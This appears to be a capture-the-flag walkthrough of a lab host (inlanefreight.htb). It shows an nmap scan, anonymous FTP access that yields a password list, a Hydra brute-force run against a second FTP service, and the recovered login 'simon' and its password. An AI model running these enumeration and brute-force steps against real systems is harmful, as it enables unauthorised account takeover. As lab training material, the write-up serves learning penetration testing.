# The Known
The target is within the `inlanefreight.htb` domain
Manages the stored emails and files (Serves as a backup)
IP: `10.129.53.129`

# Information Gathering
Adding the IP address to the `/etc/hosts`
`10.129.53.129 inlanefreight.htb`

### Nmap
`nmap -p- -sV -v 10.129.53.129`
```bash
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
|_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
53/tcp   open  domain   ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
110/tcp  open  pop3     Dovecot pop3d
|_pop3-capabilities: USER PIPELINING AUTH-RESP-CODE TOP SASL(PLAIN) CAPA RESP-CODES STLS UIDL
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Issuer: commonName=ubuntu
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-04-11T16:38:55
| Not valid after:  2032-04-08T16:38:55
| MD5:     a03e afe0 3b9e 242f 45ce 81ea 9205 485b
| SHA-1:   f95b c0ca f558 d268 5442 7213 80b6 ec09 2df5 55c0
|_SHA-256: d805 e97e 6bb7 0566 9929 f813 0e47 b059 95db ece5 89d6 e163 894c e4e5 db43 b361
|_ssl-date: TLS randomness does not represent time
995/tcp  open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: USER TOP RESP-CODES SASL(PLAIN) CAPA PIPELINING AUTH-RESP-CODE UIDL
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Issuer: commonName=ubuntu
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-04-11T16:38:55
| Not valid after:  2032-04-08T16:38:55
| MD5:     a03e afe0 3b9e 242f 45ce 81ea 9205 485b
| SHA-1:   f95b c0ca f558 d268 5442 7213 80b6 ec09 2df5 55c0
|_SHA-256: d805 e97e 6bb7 0566 9929 f813 0e47 b059 95db ece5 89d6 e163 894c e4e5 db43 b361
|_ssl-date: TLS randomness does not represent time
2121/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (InlaneFTP) [10.129.53.129]
|     Invalid command: try being more creative
|     Invalid command: try being more creative
|   NULL: 
|_    220 ProFTPD Server (InlaneFTP) [10.129.53.129]
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port2121-TCP:V=7.98%I=7%D=4/7%Time=69D5AB84%P=x86_64-pc-linux-gnu%r(NUL
SF:L,30,"220\x20ProFTPD\x20Server\x20\(InlaneFTP\)\x20\[10\.129\.53\.129\]
SF:\r\n")%r(GenericLines,8C,"220\x20ProFTPD\x20Server\x20\(InlaneFTP\)\x20
SF:\[10\.129\.53\.129\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20m
SF:ore\x20creative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x
SF:20creative\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

# Also port 30021 FTP was open
NSE: Script Post-scanning.
Initiating NSE at 21:13
Completed NSE at 21:13, 0.00s elapsed
Initiating NSE at 21:13
Completed NSE at 21:13, 0.00s elapsed
Initiating NSE at 21:13
Completed NSE at 21:13, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.51 seconds

```

### FTP
```bash
┌──(lazarus㉿Xerek)-[~]
└─$ ftp 10.129.53.129 30021
Connected to 10.129.53.129.
220 ProFTPD Server (Internal FTP) [10.129.53.129]
Name (10.129.53.129:lazarus): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||28046|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 ftp      ftp          4096 Apr 18  2022 simon
226 Transfer complete
ftp> cd simon
250 CWD command successful
ftp> ls
229 Entering Extended Passive Mode (|||54324|)
150 Opening ASCII mode data connection for file list
-rw-rw-r--   1 ftp      ftp           153 Apr 18  2022 mynotes.txt
226 Transfer complete
ftp> get mynotes.txt
local: mynotes.txt remote: mynotes.txt
229 Entering Extended Passive Mode (|||49544|)
150 Opening BINARY mode data connection for mynotes.txt (153 bytes)
100% |***********************************************************************************************************************************************************************************************|   153       48.66 KiB/s    00:00 ETA
226 Transfer complete
153 bytes received in 00:00 (2.75 KiB/s)
ftp> exit
221 Goodbye.
```

### Password List?
```bash
234987123948729384293
+23358093845098
ThatsMyBigDog
Rock!ng#May
Puuuuuh7823328
8Ns8j1b!23hs4921smHzwn
237oHs71ohls18H127!!9skaP
238u1xjn1923nZGSb261Bs81
```

Now using this, looking for a way to access Simon account on the `FTP 2121` service.
Using Hydra, one can brute force with the password.
```bash
┌──(lazarus㉿Xerek)-[~]
└─$ hydra -l "simon" -P mynotes.txt ftp://10.129.53.129:2121                              
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-07 21:27:45
[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:1/p:8), ~1 try per task
[DATA] attacking ftp://10.129.53.129:2121/
[2121][ftp] host: 10.129.53.129   login: simon   password: 8Ns8j1b!23hs4921smHzwn
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-07 21:27:54
```

# Credentials!!!
`simon:8Ns8j1b!23hs4921smHzwn`
Now just get the flag with his account 
`ftp 10.129.53.129 2121`
